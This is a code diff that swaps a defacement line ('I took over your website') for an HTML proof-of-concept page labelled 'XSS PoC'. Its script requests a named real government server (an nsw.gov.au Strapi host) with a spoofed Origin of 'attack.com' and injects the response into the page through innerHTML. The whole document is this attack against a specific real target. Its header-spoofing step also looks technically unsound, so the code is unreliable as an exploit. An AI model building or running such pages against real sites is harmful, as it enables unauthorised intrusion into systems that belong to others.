@@ -1,1 +1,30 @@
-<h1>I took over your website</h1?
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS PoC</title>
+</head>
+<body>
+    <h1>XSS PoC</h1>
+    <script>
+        // Function to handle data received from vulnerable server
+        function handleData(data) {
+            // Inject data into the page to trigger XSS
+            document.body.innerHTML = data;
+        }
+
+        // Send a request to the vulnerable server
+        fetch('https://strapi-server.account.service.nsw.gov.au/', {
+            method: 'GET',
+            headers: {
+                'Origin': 'https://attack.com'
+            }
+        })
+        .then(response => response.text())
+        .then(handleData)
+        .catch(err => console.error(err));
+    </script>
+</body>
+</html>
+
